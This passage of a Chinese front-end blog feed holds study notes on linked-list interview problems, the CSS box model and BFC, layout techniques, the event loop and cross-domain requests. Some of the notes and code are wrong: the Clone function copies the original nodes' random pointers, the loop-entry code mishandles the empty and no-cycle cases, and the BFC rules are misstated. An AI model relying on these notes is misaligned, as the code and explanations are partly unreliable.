class="line">&#125;</div></pre></td></tr></table></figure></p><p><strong>思路</strong>：<br>1、解决链表相关的工作时，我们总需要大量的指针；<br>2、需要三个指针：分别指向当前遍历到的节点、它的前一个节点及后一个节点；<br>3、尾节点就是 <code>p.next</code> 为空的节点<br>4、左右手互换</p><blockquote><p>十六、合并两个排序的链表 p145</p></blockquote><p><strong>描述</strong>：输入两个单调递增的链表，输出两个链表合成后的链表，当然我们需要合成后的链表满足单调不减规则。<br><figure class="highlight kotlin"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div></pre></td><td class="code"><pre><div class="line">function Merge(pHead1, pHead2)&#123;</div><div class="line">    <span class="keyword">if</span> (pHead1 == <span class="literal">null</span> || pHead2 == <span class="literal">null</span>) &#123; <span class="comment">//判断是不是空链表</span></div><div class="line">        <span class="keyword">return</span> pHead1 || pHead2;</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">var</span> head = <span class="literal">null</span>;</div><div class="line">    <span class="keyword">if</span> (pHead1.<span class="keyword">val</span> &lt; pHead2.<span class="keyword">val</span>) &#123;</div><div class="line">        head = pHead1;</div><div class="line">        head.next = Merge(pHead2,pHead1.next)</div><div class="line">    &#125;<span class="keyword">else</span> &#123;</div><div class="line">        head = pHead2;</div><div class="line">        head.next = Merge(pHead1, pHead2.next);</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">return</span> head;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p><p><strong>思路</strong>：是递归</p><blockquote><p>二十五、复杂链表的复制 p187</p></blockquote><p><strong>描述</strong>：输入一个复杂链表（每个节点中有节点值，以及两个指针，一个指向下一个节点，另一个特殊指针指向任意一个节点），返回结果为复制后复杂链表的head。（注意，输出结果中请不要返回参数中的节点引用，否则判题程序会直接返回空）<br><figure class="highlight haxe"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">Clone</span></span>(pHead) &#123;</div><div class="line">    <span class="keyword">if</span> (!pHead) &#123;<span class="keyword">return</span> <span class="literal">null</span>;&#125;</div><div class="line">    <span class="keyword">var</span> <span class="keyword">new</span><span class="type">Head</span> = <span class="keyword">new</span> <span class="type">RandomListNode</span>(pHead.label);</div><div class="line">    <span class="keyword">new</span><span class="type">Head</span>.random = pHead.random;</div><div class="line">    <span class="keyword">new</span><span class="type">Head</span>.next = Clone(pHead.next);</div><div class="line">    <span class="keyword">return</span> <span class="keyword">new</span><span class="type">Head</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p><p><strong>思路</strong>：<br><img src="https://i.imgur.com/3ae3VAT.png" alt=""><br>1、遍历链表，复制每个结点，如复制结点A得到A1，将结点A1插到结点A后面；<br>2、重新遍历链表，复制老结点的随机指针给新结点，如A1.random = A.random.next;<br>3、拆分链表，将链表拆分为原链表和复制后的链表</p><blockquote><p>三十六、两个链表的第一个公共结点 p253</p></blockquote><p><strong>描述</strong>：输入两个链表，找出它们的第一个公共结点。<br><figure class="highlight smali"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line">function FindFirstCommonNode(pHead1, pHead2)&#123;</div><div class="line">    var p1=pHead1;</div><div class="line">    var p2=pHead2;</div><div class="line">    while(p1!=p2)&#123;</div><div class="line">      // 先判断后面一个等号</div><div class="line">      // 第一个链表的头部如果不存在，就等于第二个链表的头部；如果存在，头部就等于自己的下一个元素</div><div class="line">        p1= p1==null?pHead2:p1.next;</div><div class="line">        p2= p2==null?pHead1:p2.next;</div><div class="line">    &#125;</div><div class="line">   <span class="built_in"> return </span>p1;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p><p><strong>思路</strong>：<br>1、只有谈到链表，就会有head<br>2、JS没有用到书上说的比较长度的方法<br>3、本题是用 栈 的特点来解决；<br>4、分别把两个链表的节点放到两个栈中，这样两个链表的尾节点就位于两个栈的栈顶，接下来比较两个栈顶的节点是否相同；<br>5、如果相同，则把栈顶弹出，接着比较下一个栈顶，直到找到最后一个相同的节点。</p><blockquote><p>四十六、圆圈中最后剩下的数 p300</p></blockquote><p><strong>描述</strong>：0,1,2,3,4,5…n-1这n个数字排成一个圆圈，从数字 0 开始，每次从这个圆圈里删除第 m 个数字。求出这个圆圈里剩下的最后一个数字。<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">LastRemaining_Solution</span><span class="params">(n, m)</span></span>&#123;</div><div class="line">  <span class="keyword">if</span>(n&lt;<span class="number">1</span>||m&lt;<span class="number">1</span>) <span class="keyword">return</span> <span class="number">-1</span>;</div><div class="line">  <span class="keyword">var</span> <span class="keyword">array</span> = [];</div><div class="line">  <span class="keyword">var</span> i = <span class="number">-1</span>,step = <span class="number">0</span>, count = n;</div><div class="line">  <span class="keyword">while</span>(count&gt;<span class="number">0</span>)&#123;   <span class="comment">//跳出循环时将最后一个元素也设置为了-1</span></div><div class="line">      i++;          <span class="comment">//指向上一个被删除对象的下一个元素。</span></div><div class="line">      <span class="keyword">if</span>(i&gt;=n) i=<span class="number">0</span>;  <span class="comment">//模拟环。</span></div><div class="line">      <span class="keyword">if</span>(<span class="keyword">array</span>[i] == <span class="number">-1</span>) <span class="keyword">continue</span>; <span class="comment">//跳过被删除的对象。</span></div><div class="line">      step++;                     <span class="comment">//记录已走过的。</span></div><div class="line">      <span class="keyword">if</span>(step==m)&#123;               <span class="comment">//找到待删除的对象。</span></div><div class="line">          <span class="keyword">array</span>[i]=<span class="number">-1</span>;</div><div class="line">          step = <span class="number">0</span>;</div><div class="line">          count--;</div><div class="line">      &#125;</div><div class="line">  &#125;</div><div class="line">  <span class="keyword">return</span> i;<span class="comment">//返回跳出循环时的i,即最后一个被设置为-1的元素</span></div><div class="line">&#125;</div></pre></td></tr></table></figure></p><p><strong>思路</strong>：<br>1、用环形链表模拟圆圈，缺点是需要一个辅助链表<br>2、需要遍历很多遍，占用内存</p><blockquote><p>五十五、链表中环的入口结点 p139</p></blockquote><p><strong>描述</strong>：给一个链表，若其中包含环，请找出该链表的环的入口结点，否则，输出null。<br><figure class="highlight kotlin"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div></pre></td><td class="code"><pre><div class="line">function EntryNodeOfLoop(pHead)&#123;</div><div class="line">    <span class="keyword">if</span>(pHead == <span class="literal">null</span>)&#123;<span class="keyword">return</span> <span class="number">1</span>;&#125;</div><div class="line">    <span class="keyword">if</span>(pHead.next == <span class="literal">null</span>)&#123;<span class="keyword">return</span> <span class="literal">null</span>;&#125;</div><div class="line">    <span class="keyword">var</span> fast = pHead;</div><div class="line">    <span class="keyword">var</span> slow = pHead;</div><div class="line">    <span class="comment">//找到一快一满指针相遇处的节点，相遇的节点一定是在环中</span></div><div class="line">    <span class="keyword">while</span>(slow != <span class="literal">null</span> &amp;&amp; fast.next != <span class="literal">null</span>)&#123;</div><div class="line">        slow = slow.next;</div><div class="line">        fast = fast.next.next;</div><div class="line">        <span class="keyword">if</span>(fast == slow) <span class="keyword">break</span>;</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    <span class="keyword">var</span> p1 = slow;</div><div class="line">    <span class="keyword">var</span> p2 = pHead;</div><div class="line">    <span class="comment">// 移动p1，p2</span></div><div class="line">    <span class="keyword">while</span>(p1 != p2)&#123;</div><div class="line">        p1 = p1.next;</div><div class="line">        p2 = p2.next;</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">return</span> p1;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p><p><strong>思路</strong>：<br>1、第一步确定有没有环：定义两个指针同时出发，一个快一个慢，走的快的追上了走得慢的，就代表里面有环，如果快的到来链尾都没追上，就没环；<br>2、第二步找入口：如果链表中的环有 n 个节点，那么第一个指针就比第二个指针先出发 n,相同的速度移动，指针2在入口时，指针1已结绕着入口一圈，也停在了入口</p><blockquote><p>五十六、删除链表中重复的结点  ？？？ T50 p39 重复的数字</p></blockquote><p><strong>描述</strong>：在一个排序的链表中，存在重复的结点，请删除该链表中重复的结点，重复的结点不保留，返回链表头指针。 例如，链表1-&gt;2-&gt;3-&gt;3-&gt;4-&gt;4-&gt;5 处理后为 1-&gt;2-&gt;5<br><figure class="highlight haxe"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">deleteDuplication</span></span>(pHead)&#123;</div><div class="line">    <span class="keyword">var</span> <span class="keyword">new</span><span class="type">Head</span> = <span class="keyword">new</span> <span class="type">ListNode</span>(<span class="string">'head'</span>);</div><div class="line">    <span class="keyword">new</span><span class="type">Head</span>.next = pHead;</div><div class="line">    <span class="keyword">var</span> pHead = <span class="keyword">new</span><span class="type">Head</span>;</div><div class="line">    <span class="keyword">var</span> qHead = pHead.next;</div><div class="line">    <span class="keyword">while</span>(qHead) &#123;</div><div class="line">        <span class="keyword">while</span>((qHead.next!=<span class="literal">null</span>) &amp;&amp; (qHead.val == qHead.next.val)) &#123;</div><div class="line">            qHead = qHead.next;</div><div class="line">        &#125;</div><div class="line">        <span class="comment">//没移动</span></div><div class="line">        <span class="keyword">if</span>(pHead.next == qHead)&#123;</div><div class="line">            pHead = qHead;</div><div class="line">            qHead = qHead.next;</div><div class="line">        &#125;</div><div class="line">        <span class="comment">//移动了</span></div><div class="line">        <span class="keyword">else</span>&#123;</div><div class="line">            qHead = qHead.next;</div><div class="line">            pHead.next = qHead;</div><div class="line">        &#125;</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">return</span> <span class="keyword">new</span><span class="type">Head</span>.next;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p><p><strong>思路</strong>：？？？</p>]]></content>
    
    <summary type="html">
    
      &lt;blockquote&gt;
&lt;p&gt;三、从尾到头打印链表 p58&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;&lt;strong&gt;描述&lt;/strong&gt;：输入一个链表，按链表值从尾到头的顺序返回一个 &lt;code&gt;ArrayList&lt;/code&gt;。&lt;br&gt;&lt;figure class=&quot;highlight javascript&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;1&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;2&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;3&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;4&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;5&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;6&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;7&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;8&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;9&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;10&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;11&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;12&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;function&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;function&lt;/span&gt; &lt;span class=&quot;title&quot;&gt;printListFromTailToHead&lt;/span&gt;(&lt;span class=&quot;params&quot;&gt;head&lt;/span&gt;)&lt;/span&gt;&amp;#123;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    &lt;span class=&quot;keyword&quot;&gt;var&lt;/span&gt; p = head;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    &lt;span class=&quot;keyword&quot;&gt;var&lt;/span&gt; result = [];&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    &lt;span class=&quot;keyword&quot;&gt;while&lt;/span&gt;(p)&amp;#123;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;      &lt;span class=&quot;comment&quot;&gt;// unshift 需要添加到数组开头的元素。&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;      &lt;span class=&quot;comment&quot;&gt;// val() 方法返回或设置被选元素的值。&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;        result.unshift(p.val);&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;        &lt;span class=&quot;comment&quot;&gt;// next() 获得匹配元素集合中每个元素紧邻的同胞元素&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;        p = p.next;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    &amp;#125;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    &lt;span class=&quot;keyword&quot;&gt;return&lt;/span&gt; result;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&amp;#125;&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;思路&lt;/strong&gt;：BUG题/&lt;code&gt;unshift()&lt;/code&gt;在数组的头部添加任意个项并返回新数组的长度&lt;br&gt;
    
    </summary>
    
    
      <category term="剑指offer" scheme="wangsiyuan233.github.io/tags/%E5%89%91%E6%8C%87offer/"/>
    
  </entry>
  
  <entry>
    <title>一面知识块(2)-- CSS盒模型</title>
    <link href="wangsiyuan233.github.io/2018/09/24/75%E4%B8%80%E9%9D%A2%E7%9F%A5%E8%AF%86%E5%9D%97-2/"/>
    <id>wangsiyuan233.github.io/2018/09/24/75一面知识块-2/</id>
    <published>2018-09-24T08:22:25.000Z</published>
    <updated>2018-10-01T00:57:56.549Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>谈谈你对CSS盒模型的认识</p></blockquote><p>一、基本概念<br>1、标准模型：宽高就是 content 的宽高<br>2、IE模型：<code>content + border + padding</code> (没有margin<br><a id="more"></a><br>二、怎么设置两种模型<br>1、标准模型：<code>box-sizing:content-box;</code>（默认）<br>2、IE模型：<code>box-sizing:border-box;</code></p><p>三、JS如何设置获取盒模型对应的宽和高<br>1、<code>dom.style.width/height</code><br>只能用于写在 <code>&lt;html&gt;</code> 尖括号里面的宽高，对于 <code>&lt;style&gt;</code> 和 link 外链表没用<br>2、<code>dom.currentStyle.width/height</code><br>都可以用，但是只支持 IE<br>3、<code>window.getComputedStyle.width/height</code><br>都可以兼容<br>4、<code>dom.getBoundingClientRect().width/height</code><br>计算元素的绝对位置,根据视窗（左上角），拿到 l-r-t-b</p><p>四、根据盒模型解释边距重叠<br>父子元素边距重叠，兄弟元素重叠，引出了BFC</p><p>五、BFC<br>概念：块级元素上下文<br>1、在BFC垂直方向上的边距会发生重叠<br>2、BFC的区域与浮动元素重叠<br>3、是一个独立的元素，内外元素互不影响<br>4、浮动元素不参与计算<br>创建BFC:【float:none】【overflow:hidden】【position不是relative,也不是static】</p><h2 id="★30s总结"><a href="#★30s总结" class="headerlink" title="★30s总结"></a>★30s总结</h2>]]></content>
    
    <summary type="html">
    
      &lt;blockquote&gt;
&lt;p&gt;谈谈你对CSS盒模型的认识&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;一、基本概念&lt;br&gt;1、标准模型：宽高就是 content 的宽高&lt;br&gt;2、IE模型：&lt;code&gt;content + border + padding&lt;/code&gt; (没有margin&lt;br&gt;
    
    </summary>
    
    
      <category term="一面知识块" scheme="wangsiyuan233.github.io/tags/%E4%B8%80%E9%9D%A2%E7%9F%A5%E8%AF%86%E5%9D%97/"/>
    
  </entry>
  
  <entry>
    <title>一面知识块（1）-- 页面布局</title>
    <link href="wangsiyuan233.github.io/2018/09/23/74%E4%B8%80%E9%9D%A2%E7%9F%A5%E8%AF%86%E5%9D%97-1/"/>
    <id>wangsiyuan233.github.io/2018/09/23/74一面知识块-1/</id>
    <published>2018-09-23T10:35:09.000Z</published>
    <updated>2018-09-24T08:10:35.541Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>假设高度已知，请写出三栏布局，左右各300px，中间自适应</p></blockquote><p><strong>解法一：浮动布局</strong></p><p><a href="http://js.jirengu.com/duzotakuse/1/edit?html,css,output" target="_blank" rel="external">【看代码点我】&gt;&gt;&gt;</a></p><h2 id="★30s总结"><a href="#★30s总结" class="headerlink" title="★30s总结"></a>★30s总结</h2><p>1、 在 <code>div</code> 里面，并不是按照 左中右 的顺序来写<br>2、 给3个 <code>div</code> 最小高度<br>3、 左浮 + 右浮<br>4、 缺点是压缩太小时，中间的字会漏下来，需要清除浮动<br><a id="more"></a><br><strong>解法二：绝对定位</strong></p><p><a href="http://js.jirengu.com/liwaluguji/1/edit?html,css,output" target="_blank" rel="external">【看代码点我】&gt;&gt;&gt;</a></p><h2 id="★30s总结-1"><a href="#★30s总结-1" class="headerlink" title="★30s总结"></a>★30s总结</h2><p>1、绝对定位就是按顺序写<br>2、中间到左边多少，中间到右边多少<br>3、每个 <code>div</code> 是 <code>absolute</code>，容器是 <code>relative</code><br>4、缺点是脱离了文档流</p><p><strong>解法三：flex布局</strong></p><p><a href="http://js.jirengu.com/domoviyevo/1/edit?html,css,output" target="_blank" rel="external">【看代码点我】&gt;&gt;&gt;</a></p><h2 id="★30s总结-2"><a href="#★30s总结-2" class="headerlink" title="★30s总结"></a>★30s总结</h2><p>1、容器是 <code>display:flex;</code><br>2、自适应是 <code>flex:1;</code><br>3、拖动时也没有漏下来<br>4、那么缺点一定是不兼容IE吧</p><p><strong>解法四：表格布局</strong></p><p><a href="http://js.jirengu.com/ronoxigemu/1/edit?html,css,output" target="_blank" rel="external">【看代码点我】&gt;&gt;&gt;</a></p><h2 id="★30s总结-3"><a href="#★30s总结-3" class="headerlink" title="★30s总结"></a>★30s总结</h2><p>1、容器里是 <code>display:table；</code><br>2、各个 <code>div</code> 里是 <code>display:table-cell;</code><br>3、优点是兼容性好<br>4、缺点是压缩以后，所有的格子都会变长</p><p><strong>解法五：网格布局</strong></p><p><a href="http://js.jirengu.com/rogilehema/1/edit?html,css,output" target="_blank" rel="external">【看代码点我】&gt;&gt;&gt;</a></p><h2 id="★30s总结-4"><a href="#★30s总结-4" class="headerlink" title="★30s总结"></a>★30s总结</h2><p>1、看起来挺清爽的<br>2、设置网格的行和咧</p><h2 id="去掉高度已知，哪种解法会崩？"><a href="#去掉高度已知，哪种解法会崩？" class="headerlink" title="去掉高度已知，哪种解法会崩？"></a>去掉高度已知，哪种解法会崩？</h2><p>只有 <code>table</code> 和 <code>flex</code> 还可以用</p>]]></content>
    
    <summary type="html">
    
      &lt;blockquote&gt;
&lt;p&gt;假设高度已知，请写出三栏布局，左右各300px，中间自适应&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;&lt;strong&gt;解法一：浮动布局&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;http://js.jirengu.com/duzotakuse/1/edit?html,css,output&quot;&gt;【看代码点我】&amp;gt;&amp;gt;&amp;gt;&lt;/a&gt;&lt;/p&gt;
&lt;h2 id=&quot;★30s总结&quot;&gt;&lt;a href=&quot;#★30s总结&quot; class=&quot;headerlink&quot; title=&quot;★30s总结&quot;&gt;&lt;/a&gt;★30s总结&lt;/h2&gt;&lt;p&gt;1、 在 &lt;code&gt;div&lt;/code&gt; 里面，并不是按照 左中右 的顺序来写&lt;br&gt;2、 给3个 &lt;code&gt;div&lt;/code&gt; 最小高度&lt;br&gt;3、 左浮 + 右浮&lt;br&gt;4、 缺点是压缩太小时，中间的字会漏下来，需要清除浮动&lt;br&gt;
    
    </summary>
    
    
      <category term="一面知识块" scheme="wangsiyuan233.github.io/tags/%E4%B8%80%E9%9D%A2%E7%9F%A5%E8%AF%86%E5%9D%97/"/>
    
  </entry>
  
  <entry>
    <title>Event Loop</title>
    <link href="wangsiyuan233.github.io/2018/09/15/73Event-Loop/"/>
    <id>wangsiyuan233.github.io/2018/09/15/73Event-Loop/</id>
    <published>2018-09-15T10:56:59.000Z</published>
    <updated>2018-09-15T12:13:40.324Z</updated>
    
    <content type="html"><![CDATA[<p>JS 是单线程语言</p><p>JS 在执行的过程中会产生执行环境，这些执行环境会被顺序的加入到执行栈中。如果遇到异步的代码，会被挂起并加入到 Task（有多种 task） 队列中。一旦执行栈为空，Event Loop 就会从 Task 队列中拿出需要执行的代码并放入执行栈中执行，所以本质上来说 <strong>JS 中的异步还是同步行为</strong>。<br><a id="more"></a><br>不同的任务源会被分配到不同的 Task 队列中，任务源可以分为 微任务（microtask） 和 宏任务（macrotask）。在 ES6 规范中，microtask 称为 jobs，macrotask 称为 task。<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div></pre></td><td class="code"><pre><div class="line"><span class="built_in">console</span>.log(<span class="string">'script start'</span>);</div><div class="line"></div><div class="line">setTimeout(<span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</div><div class="line">  <span class="built_in">console</span>.log(<span class="string">'setTimeout'</span>);</div><div class="line">&#125;, <span class="number">0</span>);</div><div class="line"></div><div class="line"><span class="keyword">new</span> <span class="built_in">Promise</span>(<span class="function">(<span class="params">resolve</span>) =&gt;</span> &#123;</div><div class="line">    <span class="built_in">console</span>.log(<span class="string">'Promise'</span>)</div><div class="line">    resolve()</div><div class="line">&#125;).then(<span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</div><div class="line">  <span class="built_in">console</span>.log(<span class="string">'promise1'</span>);</div><div class="line">&#125;).then(<span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</div><div class="line">  <span class="built_in">console</span>.log(<span class="string">'promise2'</span>);</div><div class="line">&#125;);</div><div class="line"></div><div class="line"><span class="built_in">console</span>.log(<span class="string">'script end'</span>);</div><div class="line"><span class="comment">// script start =&gt; Promise =&gt; script end =&gt; promise1 =&gt; promise2 =&gt; setTimeout</span></div></pre></td></tr></table></figure></p><p>以上代码虽然 <code>setTimeout</code> 写在 <code>Promise</code> 之前，但是因为 <code>Promise</code> 属于微任务而 <code>setTimeout</code> 属于宏任务，所以会有以上的打印。</p><p>微任务包括 <code>process.nextTick</code> ，<code>promise</code> ，<code>Object.observe</code> ，<code>MutationObserver</code></p><p>宏任务包括 <code>script</code> ， <code>setTimeout</code> ，<code>setInterval</code> ，<code>setImmediate</code> ，<code>I/O</code> ，<code>UI rendering</code></p><p>很多人有个误区，认为微任务快于宏任务，其实是错误的。因为宏任务中包括了 <code>script</code> ，<strong>浏览器会先执行一个宏任务，接下来有异步代码的话就先执行微任务。</strong></p><p>所以正确的一次 Event loop 顺序是这样的：</p><ul><li>执行同步代码，这属于宏任务</li><li>执行栈为空，查询是否有微任务需要执行</li><li>执行所有微任务</li><li>必要的话渲染 UI</li><li>然后开始下一轮 Event loop，执行宏任务中的异步代码<br>通过上述的 Event loop 顺序可知，如果宏任务中的异步代码有大量的计算并且需要操作 DOM 的话，为了更快的 界面响应，我们可以把操作 DOM 放入微任务中。</li></ul><hr><p><a href="https://github.com/InterviewMap/CS-Interview-Knowledge-Map/blob/master/Browser/browser-ch.md#node-%E4%B8%AD%E7%9A%84-event-loop" target="_blank" rel="external">Node 中的 Event loop</a></p><p>学完 node 之后补充</p><h2 id="★30s总结"><a href="#★30s总结" class="headerlink" title="★30s总结"></a>★30s总结</h2><ul><li>任务分为 微观任务 和 宏观任务</li><li>先宏观的同步代码</li><li>发现有微观！</li><li>做微观吧（<code>promise</code> ）</li><li>继续宏观的异步代码</li></ul>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;JS 是单线程语言&lt;/p&gt;
&lt;p&gt;JS 在执行的过程中会产生执行环境，这些执行环境会被顺序的加入到执行栈中。如果遇到异步的代码，会被挂起并加入到 Task（有多种 task） 队列中。一旦执行栈为空，Event Loop 就会从 Task 队列中拿出需要执行的代码并放入执行栈中执行，所以本质上来说 &lt;strong&gt;JS 中的异步还是同步行为&lt;/strong&gt;。&lt;br&gt;
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>跨域</title>
    <link href="wangsiyuan233.github.io/2018/09/13/72%E8%B7%A8%E5%9F%9F/"/>
    <id>wangsiyuan233.github.io/2018/09/13/72跨域/</id>
    <published>2018-09-13T01:36:18.000Z</published>
    <updated>2018-09-15T10:57:34.577Z</updated>
    
    <content type="html"><![CDATA[<p>浏览器出于安全的考虑，采用的是同源策略。</p><p>协议、域名和端口号三者统一，就是同域，只要有其中一个不一样，就是跨域，这时Ajax就会请求失败。</p><p>下面有三种方法可以解决跨域的问题<br><a id="more"></a></p><blockquote><p>一、JSONP</p></blockquote><p><code>JSONP</code> 的原理非常简单：</p><p>利用 <code>&lt;script&gt;</code> 标签没有跨域限制的漏洞，通过 <code>&lt;script&gt;</code> 标签指向一个需要访问的地址并提供一个回调函数来接收数据。<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">"http://domain/api?param1=a&amp;param2=b&amp;callback=jsonp"</span>&gt;</span><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript"></span></div><div class="line">    <span class="function"><span class="keyword">function</span> <span class="title">jsonp</span>(<span class="params">data</span>) </span>&#123;</div><div class="line">    <span class="built_in">console</span>.log(data)</div><div class="line">&#125;</div><div class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></div></pre></td></tr></table></figure></p><p><code>JSONP</code>的兼容性很好，但只限于 <strong>GET</strong> 请求</p><p>在开发中可能会遇到多个 <code>JSONP</code> 请求的回调函数名是相同的，这时候就需要自己封装一个 <code>JSONP</code>，以下是简单实现：<br><figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div></pre></td><td class="code"><pre><div class="line">function <span class="keyword">jsonp(url, </span><span class="keyword">jsonpCallback, </span>success) &#123;</div><div class="line">  let <span class="keyword">script </span>= document.createElement(<span class="string">"script"</span>)<span class="comment">;</span></div><div class="line">  <span class="keyword">script.src </span>= url<span class="comment">;</span></div><div class="line">  <span class="keyword">script.async </span>= true<span class="comment">;</span></div><div class="line">  <span class="keyword">script.type </span>= <span class="string">"text/javascript"</span><span class="comment">;</span></div><div class="line">  window[<span class="keyword">jsonpCallback] </span>= function(data) &#123;</div><div class="line">    success &amp;&amp; success(data)<span class="comment">;</span></div><div class="line">  &#125;<span class="comment">;</span></div><div class="line">  document.<span class="keyword">body.appendChild(script);</span></div><div class="line">&#125;</div><div class="line"><span class="keyword">jsonp(</span></div><div class="line">  <span class="string">"http://xxx"</span>,</div><div class="line">  <span class="string">"callback"</span>,</div><div class="line">  function(value) &#123;</div><div class="line">    console.log(value)<span class="comment">;</span></div><div class="line">  &#125;</div><div class="line">)<span class="comment">;</span></div></pre></td></tr></table></figure></p><blockquote><p>二、CORS</p></blockquote><p><code>CORS</code> 需要<strong>浏览器</strong>和<strong>后端</strong>同时支持。</p><p>服务端设置 <code>Access-Control-Allow-Origin</code> 就可以开启 CORS。 该属性表示哪些域名可以访问资源，如果设置通配符则表示所有网站都可以访问资源。</p><p>实现 <code>CORS</code> 通信的关键是后端。只要后端实现了 <code>CORS</code>，就实现了跨域。</p><blockquote><p>三、document.domain</p></blockquote><p>该方式只能用于二级域名相同的情况下，比如 <code>a.test.com</code> 和 <code>b.test.com</code> 适用于该方式。</p><p>只需要给页面添加 <code>document.domain = &#39;test.com&#39;</code> 